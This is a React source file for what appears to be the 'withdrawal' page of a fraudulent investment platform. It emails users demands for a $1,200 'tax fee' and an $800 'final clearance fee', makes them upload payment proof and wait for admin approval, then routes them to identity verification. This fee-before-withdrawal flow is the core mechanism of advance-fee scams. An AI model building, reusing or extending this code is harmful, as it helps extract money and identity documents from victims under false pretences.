import React, { useEffect, useRef, useState } from "react";
import {
  Box,
  Stepper,
  Step,
  StepLabel,
  Typography,
  Button,
  Paper,
  Chip,
  Avatar,
  LinearProgress,
  useMediaQuery,
} from "@mui/material";
import { useTheme } from "@mui/material/styles";
import CloudUploadIcon from "@mui/icons-material/CloudUpload";
import HourglassEmptyIcon from "@mui/icons-material/HourglassEmpty";
import { doc, getDoc, onSnapshot, setDoc, updateDoc, serverTimestamp } from "firebase/firestore";
import { auth, db } from "../firebase";
import { onAuthStateChanged } from "firebase/auth";
import { useNavigate } from "react-router-dom";
import emailjs from "emailjs-com";

import {
  TAX_FEE_EMAIL,
  FINAL_CLEARANCE_FEE_EMAIL,
} from "../emails/withdrawalEmails";

const TOTAL_STEPS = 4;

export default function WithdrawalProcess() {
  const theme = useTheme();
  const isMobile = useMediaQuery(theme.breakpoints.down("sm"));
  const containerRef = useRef(null);
  const navigate = useNavigate();

  const [user, setUser] = useState(null);
  const [activeStep, setActiveStep] = useState(0);
  const [adminConfirmed, setAdminConfirmed] = useState([false, false, false, false]);
  const [proofs, setProofs] = useState({});
  const [emailsSent, setEmailsSent] = useState({});
  const [loading, setLoading] = useState(true);

  // Auth
  useEffect(() => {
    const unsub = onAuthStateChanged(auth, setUser);
    return unsub;
  }, []);

  // Firestore
  useEffect(() => {
    if (!user) {
      setLoading(false);
      return;
    }

    const refDoc = doc(db, "withdrawals", user.uid);

    const unsub = onSnapshot(refDoc, async (snap) => {
      if (!snap.exists()) {
        await setDoc(refDoc, {
          step: 0,
          adminConfirmed: [false, false, false, false],
          proofs: {},
          emailsSent: {},
          createdAt: serverTimestamp(),
        });
        setLoading(false);
        return;
      }

      const data = snap.data();
      setActiveStep(data.step ?? 0);
      setAdminConfirmed(data.adminConfirmed ?? []);
      setProofs(data.proofs ?? {});
      setEmailsSent(data.emailsSent ?? {});
      setLoading(false);
    });

    return unsub;
  }, [user]);

  useEffect(() => {
    containerRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [activeStep]);

  // Base64 upload (unchanged)
  const fileToBase64 = (file) =>
    new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(reader.result);
      reader.onerror = reject;
      reader.readAsDataURL(file);
    });

  const handleUpload = async (e) => {
    const file = e.target.files[0];
    if (!file || adminConfirmed[activeStep]) return;

    const base64 = await fileToBase64(file);
    await updateDoc(doc(db, "withdrawals", user.uid), {
      [`proofs.${activeStep}`]: base64,
      updatedAt: serverTimestamp(),
    });
  };

  // 🔥 EMAIL HANDLER
  const sendEmailOnce = async (key, template, amount) => {
  try {
    const ref = doc(db, "withdrawals", user.uid);
    const snap = await getDoc(ref);
    const data = snap.exists() ? snap.data() : {};

    // Prevent duplicate email
    if (data?.emailsSent?.[key]) return;

    // Prepare EmailJS params
    const params = template.getParams({
      to_name: user.displayName || "Valued Customer",
      to_email: user.email,
      amount,
    });

    // Send email using EmailJS
    await emailjs.send(
      import.meta.env.VITE_EMAILJS_SERVICE_ID,
      template.templateId,
      params,
      import.meta.env.VITE_EMAILJS_PUBLIC_KEY
    );

    // Mark email as sent
    await updateDoc(ref, {
      [`emailsSent.${key}`]: true,
      updatedAt: serverTimestamp(),
    });
  } catch (err) {
    console.error("Email send failed:", err);
    throw new Error("Unable to send email. Please try again.");
  }
};



  // Proceed
  const handleProceed = async () => {
  if (activeStep === TOTAL_STEPS - 1) {
    navigate("/verify-identity");
    return;
  }

  if (!adminConfirmed[activeStep]) return;

  try {
    if (activeStep === 0) {
      await sendEmailOnce("taxFee", TAX_FEE_EMAIL, "$1,200");
    }

    if (activeStep === 1) {
      await sendEmailOnce("finalClearance", FINAL_CLEARANCE_FEE_EMAIL, "$800");
    }

    // Advance to next step only after email succeeds
    await updateDoc(doc(db, "withdrawals", user.uid), {
      step: activeStep + 1,
      updatedAt: serverTimestamp(),
    });
  } catch (err) {
    alert(err.message); // shows "Unable to send email. Please try again."
  }
};

  const getMessage = () => {
    switch (activeStep) {
      case 0:
        return "An email has been sent to you, follow the steps in the email to process your withdrawal.";
      case 1:
      case 2:
        return "Check your email to proceed with the next step.";
      case 3:
        return "Process Completed";
      default:
        return "";
    }
  };

  if (loading) {
    return (
      <Box
        sx={{
          minHeight: "60vh",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
        }}
      >
        <Typography variant="body2" color="text.secondary">
          Loading withdrawal process…
        </Typography>
      </Box>
    );
  }

  return (
    <Box
      ref={containerRef}
      sx={{
        minHeight: "100vh",
        bgcolor: "background.default",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        p: 0,
      }}
    >
      <Paper
        elevation={1}
        sx={{
          width: "100%",
          maxWidth: 620,
          p: { xs: 2.5, sm: 4 },
          borderRadius: 3,
        }}
      >
        {/* Progress Indicator */}
        {isMobile ? (
          <Box sx={{ mb: 4 }}>
            <LinearProgress
              variant="determinate"
              value={(activeStep / (TOTAL_STEPS - 1)) * 100}
              sx={{ height: 8, borderRadius: 5 }}
            />
            <Typography variant="caption" align="center" display="block" sx={{ mt: 1 }}>
              Step {activeStep + 1} of {TOTAL_STEPS}
            </Typography>
          </Box>
        ) : (
          <Stepper
            activeStep={activeStep}
            alternativeLabel
            sx={{ mb: 4, "& .MuiStepLabel-label": { display: "none" } }}
          >
            {[0, 1, 2, 3].map((i) => (
              <Step key={i}>
                <StepLabel />
              </Step>
            ))}
          </Stepper>
        )}

        <Typography
          variant={activeStep === 3 ? "h5" : "body1"}
          align="center"
          sx={{ mb: 2, fontWeight: activeStep === 3 ? 600 : 400 }}
        >
          {getMessage()}
        </Typography>

        {!adminConfirmed[activeStep] && activeStep !== 3 && (
          <Box display="flex" justifyContent="center" mb={3}>
            <Chip
              icon={<HourglassEmptyIcon />}
              label="Waiting for admin review"
              color="warning"
              variant="outlined"
            />
          </Box>
        )}

        {activeStep !== 3 && (
          <Box
            sx={{
              border: "1px dashed",
              borderColor: "divider",
              borderRadius: 2,
              p: 3,
              textAlign: "center",
              mb: 3,
              opacity: adminConfirmed[activeStep] ? 0.6 : 1,
            }}
          >
            {!proofs[activeStep] ? (
              <>
                <CloudUploadIcon sx={{ fontSize: 40, mb: 1, color: "text.secondary" }} />
                <Typography variant="body2" sx={{ mb: 1 }}>
                  Upload proof of step completion
                </Typography>
                <Button
                  variant="outlined"
                  component="label"
                  size="small"
                  disabled={adminConfirmed[activeStep]}
                >
                  Upload Image
                  <input type="file" hidden accept="image/*" onChange={handleUpload} />
                </Button>
              </>
            ) : (
              <Avatar
                variant="rounded"
                src={proofs[activeStep]}
                sx={{ width: "100%", height: 180, borderRadius: 2 }}
              />
            )}
          </Box>
        )}

        {activeStep === 3 && (
          <Typography align="center" variant="body2" color="text.secondary" sx={{ mb: 3 }}>
            Your withdrawal process has been successfully completed.
          </Typography>
        )}

        <Button
          fullWidth
          size="large"
          variant="contained"
          disabled={activeStep !== TOTAL_STEPS - 1 && !adminConfirmed[activeStep]}
          onClick={handleProceed}
          sx={{ py: 1.4, borderRadius: 2, textTransform: "none", fontWeight: 600 }}
        >
          Proceed
        </Button>
      </Paper>
    </Box>
  );
}

